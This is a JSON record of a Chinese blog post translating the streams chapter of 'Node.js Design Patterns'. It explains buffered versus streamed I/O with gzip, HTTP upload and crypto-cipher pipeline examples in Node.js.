{"_id":{"$oid":"5a4b76348b69bb25d83da3e2"},"id":"5a4a377151882546f00a68c9","author":{"$oid":"5a4b76338b69bb25d83da3ce"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/1/160b1e8eb6b75a9c?w=1134\u0026h=678\u0026f=png\u0026s=166664","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8eb858cfbe?w=1148\u0026h=686\u0026f=png\u0026s=116477","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ec15f9f9a?w=1324\u0026h=146\u0026f=png\u0026s=83406","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ebb82f425?w=2878\u0026h=898\u0026f=png\u0026s=332632","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ec948adff?w=1118\u0026h=420\u0026f=png\u0026s=231991","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ebb1158b0?w=810\u0026h=350\u0026f=png\u0026s=42295","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ef108f983?w=846\u0026h=348\u0026f=png\u0026s=53242","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8efb092002?w=1012\u0026h=366\u0026f=png\u0026s=171111","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8eff79bcea?w=434\u0026h=211\u0026f=png\u0026s=21128","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8efd24ea8a?w=459\u0026h=217\u0026f=png\u0026s=20473","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f05fcf733?w=757\u0026h=206\u0026f=png\u0026s=89158","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f064f1a2d?w=471\u0026h=153\u0026f=png\u0026s=14706","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f27939bc7?w=955\u0026h=1076\u0026f=png\u0026s=141176","https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f2510f072?w=754\u0026h=238\u0026f=png\u0026s=109160"],"screenShot":null}],"title":"《Node.js设计模式》使用流进行编码","meta":{"likeCount":0},"tag":["API","服务器","Node.js","前端"],"comment":[],"shortContent":"本系列文章为《Node.js Design Patterns Second Edition》的原文翻译和读书笔记，在GitHub连载更新，同步翻译版链接。 Streams是Node.js最重要的组件和模式之一。 社区中有一句格言“Stream all the things（St…","content":"\u003cp\u003e本系列文章为\u003ca target=\"_blank\" href=\"https://book.douban.com/subject/26819950/\"\u003e《Node.js Design Patterns Second Edition》\u003c/a\u003e的原文翻译和读书笔记，在GitHub连载更新，\u003ca target=\"_blank\" href=\"https://github.com/xingbofeng/Node.js-Design-Patterns-Second-Edition\"\u003e同步翻译版链接\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e欢迎关注我的专栏，之后的博文将在专栏同步：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://juejin.im/user/587a050661ff4b0065f1951c\"\u003eEncounter的掘金专栏\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/encounter\"\u003e知乎专栏 Encounter的编程思考\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://segmentfault.com/blog/xingbofeng\"\u003esegmentfault专栏 前端小站\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 class=\"heading\"\u003eCoding with Streams\u003c/h1\u003e\n\u003cp\u003e\u003ccode\u003eStreams\u003c/code\u003e是\u003ccode\u003eNode.js\u003c/code\u003e最重要的组件和模式之一。 社区中有一句格言“Stream all the things（Steam就是所有的）”，仅此一点就足以描述流在\u003ccode\u003eNode.js\u003c/code\u003e中的地位。 \u003ccode\u003eDominic Tarr\u003c/code\u003e作为\u003ccode\u003eNode.js\u003c/code\u003e社区的最大贡献者，它将流定义为\u003ccode\u003eNode.js\u003c/code\u003e最好，也是最难以理解的概念。\u003c/p\u003e\n\u003cp\u003e使\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003eStreams\u003c/code\u003e如此吸引人还有其它原因; 此外，\u003ccode\u003eStreams\u003c/code\u003e不仅与性能或效率等技术特性有关，更重要的是它们的优雅性以及它们与\u003ccode\u003eNode.js\u003c/code\u003e的设计理念完美契合的方式。\u003c/p\u003e\n\u003cp\u003e在本章中，将会学到以下内容：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eStreams\u003c/code\u003e对于\u003ccode\u003eNode.js\u003c/code\u003e的重要性。\u003c/li\u003e\n\u003cli\u003e如何创建并使用\u003ccode\u003eStreams\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eStreams\u003c/code\u003e作为编程范式，不只是对于\u003ccode\u003eI/O\u003c/code\u003e而言，在多种应用场景下它的应用和强大的功能。\u003c/li\u003e\n\u003cli\u003e管道模式和在不同的配置中连接\u003ccode\u003eStreams\u003c/code\u003e。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e发现Streams的重要性\u003c/h2\u003e\n\u003cp\u003e在基于事件的平台（如\u003ccode\u003eNode.js\u003c/code\u003e）中，处理\u003ccode\u003eI / O\u003c/code\u003e的最有效的方法是实时处理，一旦有输入的信息，立马进行处理，一旦有需要输出的结果，也立马输出反馈。\u003c/p\u003e\n\u003cp\u003e在本节中，我们将首先介绍\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003eStreams\u003c/code\u003e和它的优点。 请记住，这只是一个概述，因为本章后面将会详细介绍如何使用和组合\u003ccode\u003eStreams\u003c/code\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eStreams和Buffer的比较\u003c/h3\u003e\n\u003cp\u003e我们在本书中几乎所有看到过的异步API都是使用的\u003ccode\u003eBuffer\u003c/code\u003e模式。 对于输入操作，\u003ccode\u003eBuffer\u003c/code\u003e模式会将来自资源的所有数据收集到\u003ccode\u003eBuffer\u003c/code\u003e区中; 一旦读取完整个资源，就会把结果传递给回调函数。 下图显示了这个范例的一个真实的例子：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8eb6b75a9c?w=1134\u0026amp;h=678\u0026amp;f=png\u0026amp;s=166664\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e从上图我们可以看到，在\u003cstrong\u003et1\u003c/strong\u003e时刻，一些数据从资源接收并保存到缓冲区。 在\u003cstrong\u003et2\u003c/strong\u003e时刻，最后一段数据被接收到另一个数据块，完成读取操作，这时，把整个缓冲区的内容发送给消费者。\u003c/p\u003e\n\u003cp\u003e另一方面，\u003ccode\u003eStreams\u003c/code\u003e允许你在数据到达时立即处理数据。 如下图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8eb858cfbe?w=1148\u0026amp;h=686\u0026amp;f=png\u0026amp;s=116477\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这一张图显示了\u003ccode\u003eStreams\u003c/code\u003e如何从资源接收每个新的数据块，并立即提供给消费者，消费者现在不必等待缓冲区中收集所有数据再处理每个数据块。\u003c/p\u003e\n\u003cp\u003e但是这两种方法有什么区别呢？ 我们可以将它们概括为两点：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e空间效率\u003c/li\u003e\n\u003cli\u003e时间效率\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e此外，\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003eStreams\u003c/code\u003e具有另一个重要的优点：\u003cstrong\u003e可组合性（composability）\u003c/strong\u003e。 现在让我们看看这些属性对我们设计和编写应用程序的方式会产生什么影响。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e空间效率\u003c/h3\u003e\n\u003cp\u003e首先，\u003ccode\u003eStreams\u003c/code\u003e允许我们做一些看起来不可能的事情，通过缓冲数据并一次性处理。 例如，考虑一下我们必须读取一个非常大的文件，比如说数百\u003ccode\u003eMB\u003c/code\u003e甚至千\u003ccode\u003eMB\u003c/code\u003e。 显然，等待完全读取文件时返回大\u003ccode\u003eBuffer\u003c/code\u003e的\u003ccode\u003eAPI\u003c/code\u003e不是一个好主意。 想象一下，如果并发读取一些大文件， 我们的应用程序很容易耗尽内存。 除此之外，\u003ccode\u003eV8\u003c/code\u003e中的\u003ccode\u003eBuffer\u003c/code\u003e不能大于\u003ccode\u003e0x3FFFFFFF\u003c/code\u003e字节（小于\u003ccode\u003e1GB\u003c/code\u003e）。 所以，在耗尽物理内存之前，我们可能会碰壁。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用Buffered的API进行压缩文件\u003c/h3\u003e\n\u003cp\u003e举一个具体的例子，让我们考虑一个简单的命令行接口（\u003ccode\u003eCLI\u003c/code\u003e）的应用程序，它使用\u003ccode\u003eGzip\u003c/code\u003e格式压缩文件。 使用\u003ccode\u003eBuffered\u003c/code\u003e的\u003ccode\u003eAPI\u003c/code\u003e，这样的应用程序在\u003ccode\u003eNode.js\u003c/code\u003e中大概这么编写（为简洁起见，省略了异常处理）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e zlib = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'zlib'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e file = process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e];\nfs.readFile(file, (err, buffer) =\u0026gt; {\n  zlib.gzip(buffer, (err, buffer) =\u0026gt; {\n    fs.writeFile(file + \u003cspan class=\"hljs-string\"\u003e'.gz'\u003c/span\u003e, buffer, err =\u0026gt; {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'File successfully compressed'\u003c/span\u003e);\n    });\n  });\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在，我们可以尝试将前面的代码放在一个叫做\u003ccode\u003egzip.js\u003c/code\u003e的文件中，然后执行下面的命令：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode gzip \u0026lt;path to file\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果我们选择一个足够大的文件，比如说大于\u003ccode\u003e1GB\u003c/code\u003e的文件，我们会收到一个错误信息，说明我们要读取的文件大于最大允许的缓冲区大小，如下所示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eRangeError: File size is greater than possible Buffer:0x3FFFFFFF\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ec15f9f9a?w=1324\u0026amp;h=146\u0026amp;f=png\u0026amp;s=83406\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e上面的例子中，没找到一个大文件，但确实对于大文件的读取速率慢了许多。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e正如我们所预料到的那样，使用\u003ccode\u003eBuffer\u003c/code\u003e来进行大文件的读取显然是错误的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用Streams进行压缩文件\u003c/h3\u003e\n\u003cp\u003e我们必须修复我们的\u003ccode\u003eGzip\u003c/code\u003e应用程序，并使其处理大文件的最简单方法是使用\u003ccode\u003eStreams\u003c/code\u003e的\u003ccode\u003eAPI\u003c/code\u003e。 让我们看看如何实现这一点。 让我们用下面的代码替换刚创建的模块的内容：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e zlib = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'zlib'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e file = process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e];\nfs.createReadStream(file)\n  .pipe(zlib.createGzip())\n  .pipe(fs.createWriteStream(file + \u003cspan class=\"hljs-string\"\u003e'.gz'\u003c/span\u003e))\n  .on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'File successfully compressed'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e“是吗？”你可能会问。是的；正如我们所说的，由于\u003ccode\u003eStreams\u003c/code\u003e的接口和可组合性，因此我们还能写出这样的更加简洁，优雅和精炼的代码。 我们稍后会详细地看到这一点，但是现在需要认识到的重要一点是，程序可以顺畅地运行在任何大小的文件上，理想情况是内存利用率不变。 尝试一下（但考虑压缩一个大文件可能需要一段时间）。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e时间效率\u003c/h3\u003e\n\u003cp\u003e现在让我们考虑一个压缩文件并将其上传到远程\u003ccode\u003eHTTP\u003c/code\u003e服务器的应用程序的例子，该远程\u003ccode\u003eHTTP\u003c/code\u003e服务器进而将其解压缩并保存到文件系统中。如果我们的客户端是使用\u003ccode\u003eBuffered\u003c/code\u003e的\u003ccode\u003eAPI\u003c/code\u003e实现的，那么只有当整个文件被读取和压缩时，上传才会开始。 另一方面，只有在接收到所有数据的情况下，解压缩才会在服务器上启动。 实现相同结果的更好的解决方案涉及使用\u003ccode\u003eStreams\u003c/code\u003e。 在客户端机器上，\u003ccode\u003eStreams\u003c/code\u003e只要从文件系统中读取就可以压缩和发送数据块，而在服务器上，只要从远程对端接收到数据块，就可以解压每个数据块。 我们通过构建前面提到的应用程序来展示这一点，从服务器端开始。\u003c/p\u003e\n\u003cp\u003e我们创建一个叫做\u003ccode\u003egzipReceive.js\u003c/code\u003e的模块，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e http = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e zlib = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'zlib'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e server = http.createServer(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e filename = req.headers.filename;\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'File request received: '\u003c/span\u003e + filename);\n  req\n    .pipe(zlib.createGunzip())\n    .pipe(fs.createWriteStream(filename))\n    .on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; {\n      res.writeHead(\u003cspan class=\"hljs-number\"\u003e201\u003c/span\u003e, {\n        \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'text/plain'\u003c/span\u003e\n      });\n      res.end(\u003cspan class=\"hljs-string\"\u003e'That\\'s it\\n'\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`File saved: \u003cspan class=\"hljs-subst\"\u003e${filename}\u003c/span\u003e`\u003c/span\u003e);\n    });\n});\n\nserver.listen(\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Listening'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e服务器从网络接收数据块，将其解压缩，并在接收到数据块后立即保存，这要归功于\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003eStreams\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e我们的应用程序的客户端将进入一个名为\u003ccode\u003egzipSend.js\u003c/code\u003e的模块，如下所示：\u003c/p\u003e\n\u003cp\u003e在前面的代码中，我们再次使用\u003ccode\u003eStreams\u003c/code\u003e从文件中读取数据，然后在从文件系统中读取的同时压缩并发送每个数据块。\u003c/p\u003e\n\u003cp\u003e现在，运行这个应用程序，我们首先使用以下命令启动服务器：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode gzipReceive\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后，我们可以通过指定要发送的文件和服务器的地址（例如\u003ccode\u003elocalhost\u003c/code\u003e）来启动客户端：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode gzipSend \u0026lt;path to file\u0026gt; localhost\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ebb82f425?w=2878\u0026amp;h=898\u0026amp;f=png\u0026amp;s=332632\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e如果我们选择一个足够大的文件，我们将更容易地看到数据如何从客户端流向服务器，但为什么这种模式下，我们使用\u003ccode\u003eStreams\u003c/code\u003e，比使用\u003ccode\u003eBuffered\u003c/code\u003e的\u003ccode\u003eAPI\u003c/code\u003e更有效率？ 下图应该给我们一个提示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ec948adff?w=1118\u0026amp;h=420\u0026amp;f=png\u0026amp;s=231991\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e一个文件被处理的过程，它经过以下阶段：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e客户端从文件系统中读取\u003c/li\u003e\n\u003cli\u003e客户端压缩数据\u003c/li\u003e\n\u003cli\u003e客户端将数据发送到服务器\u003c/li\u003e\n\u003cli\u003e服务端接收数据\u003c/li\u003e\n\u003cli\u003e服务端解压数据\u003c/li\u003e\n\u003cli\u003e服务端将数据写入磁盘\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e为了完成处理，我们必须按照流水线顺序那样经过每个阶段，直到最后。在上图中，我们可以看到，使用\u003ccode\u003eBuffered\u003c/code\u003e的\u003ccode\u003eAPI\u003c/code\u003e，这个过程完全是顺序的。为了压缩数据，我们首先必须等待整个文件被读取完毕，然后，发送数据，我们必须等待整个文件被读取和压缩，依此类推。当我们使用\u003ccode\u003eStreams\u003c/code\u003e时，只要我们收到第一个数据块，流水线就会被启动，而不需要等待整个文件的读取。但更令人惊讶的是，当下一块数据可用时，不需要等待上一组任务完成；相反，另一条装配线是并行启动的。因为我们执行的每个任务都是异步的，这样显得很完美，所以可以通过\u003ccode\u003eNode.js\u003c/code\u003e来并行执行\u003ccode\u003eStreams\u003c/code\u003e的相关操作；唯一的限制就是每个阶段都必须保证数据块的到达顺序。\u003c/p\u003e\n\u003cp\u003e从前面的图可以看出，使用\u003ccode\u003eStreams\u003c/code\u003e的结果是整个过程花费的时间更少，因为我们不用等待所有数据被全部读取完毕和处理。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e组合性\u003c/h3\u003e\n\u003cp\u003e到目前为止，我们已经看到的代码已经告诉我们如何使用\u003ccode\u003epipe()\u003c/code\u003e方法来组装\u003ccode\u003eStreams\u003c/code\u003e的数据块，\u003ccode\u003eStreams\u003c/code\u003e允许我们连接不同的处理单元，每个处理单元负责单一的职责（这是符合\u003ccode\u003eNode.js\u003c/code\u003e风格的）。这是可能的，因为\u003ccode\u003eStreams\u003c/code\u003e具有统一的接口，并且就\u003ccode\u003eAPI\u003c/code\u003e而言，不同\u003ccode\u003eStreams\u003c/code\u003e也可以很好的进行交互。唯一的先决条件是管道的下一个\u003ccode\u003eStreams\u003c/code\u003e必须支持上一个\u003ccode\u003eStreams\u003c/code\u003e生成的数据类型，可以是二进制，文本甚至是对象，我们将在后面的章节中看到。\u003c/p\u003e\n\u003cp\u003e为了证明\u003ccode\u003eStreams\u003c/code\u003e组合性的优势，我们可以尝试在我们先前构建的\u003ccode\u003egzipReceive / gzipSend\u003c/code\u003e应用程序中添加加密功能。\n为此，我们只需要通过向流水线添加另一个\u003ccode\u003eStreams\u003c/code\u003e来更新客户端。 确切地说，由\u003ccode\u003ecrypto.createChipher()\u003c/code\u003e返回的流。 由此产生的代码应如下所示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e zlib = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'zlib'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e crypto = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'crypto'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e http = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e path = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e file = process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e];\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e server = process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e];\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e options = {\n  \u003cspan class=\"hljs-attr\"\u003ehostname\u003c/span\u003e: server,\n  \u003cspan class=\"hljs-attr\"\u003eport\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003emethod\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'PUT'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eheaders\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003efilename\u003c/span\u003e: path.basename(file),\n    \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'application/octet-stream'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'Content-Encoding'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'gzip'\u003c/span\u003e\n  }\n};\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e req = http.request(options, res =\u0026gt; {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Server response: '\u003c/span\u003e + res.statusCode);\n});\n\nfs.createReadStream(file)\n  .pipe(zlib.createGzip())\n  .pipe(crypto.createCipher(\u003cspan class=\"hljs-string\"\u003e'aes192'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'a_shared_secret'\u003c/span\u003e))\n  .pipe(req)\n  .on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'File successfully sent'\u003c/span\u003e);\n  });\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e使用相同的方式，我们更新服务端的代码，使得它可以在数据块进行解压之前先解密：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e http = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e zlib = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'zlib'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e crypto = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'crypto'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e server = http.createServer(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e filename = req.headers.filename;\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'File request received: '\u003c/span\u003e + filename);\n  req\n    .pipe(crypto.createDecipher(\u003cspan class=\"hljs-string\"\u003e'aes192'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'a_shared_secret'\u003c/span\u003e))\n    .pipe(zlib.createGunzip())\n    .pipe(fs.createWriteStream(filename))\n    .on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; {\n      res.writeHead(\u003cspan class=\"hljs-number\"\u003e201\u003c/span\u003e, {\n        \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'text/plain'\u003c/span\u003e\n      });\n      res.end(\u003cspan class=\"hljs-string\"\u003e'That\\'s it\\n'\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`File saved: \u003cspan class=\"hljs-subst\"\u003e${filename}\u003c/span\u003e`\u003c/span\u003e);\n    });\n});\n\nserver.listen(\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Listening'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://nodejs.org/dist/latest-v9.x/docs/api/crypto.html#crypto_crypto\"\u003ecrypto\u003c/a\u003e是Node.js的核心模块之一，提供了一系列加密算法。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e只需几行代码，我们就在应用程序中添加了一个加密层。 我们只需要简单地通过把已经存在的\u003ccode\u003eStreams\u003c/code\u003e模块和加密层组合到一起，就可以。类似的，我们可以添加和合并其他\u003ccode\u003eStreams\u003c/code\u003e，如同在玩乐高积木一样。\u003c/p\u003e\n\u003cp\u003e显然，这种方法的主要优点是可重用性，但正如我们从目前为止所介绍的代码中可以看到的那样，\u003ccode\u003eStreams\u003c/code\u003e也可以实现更清晰，更模块化，更加简洁的代码。 出于这些原因，流通常不仅仅用于处理纯粹的\u003ccode\u003eI / O\u003c/code\u003e，而且它还是简化和模块化代码的手段。\u003c/p\u003e\n\u003ch2 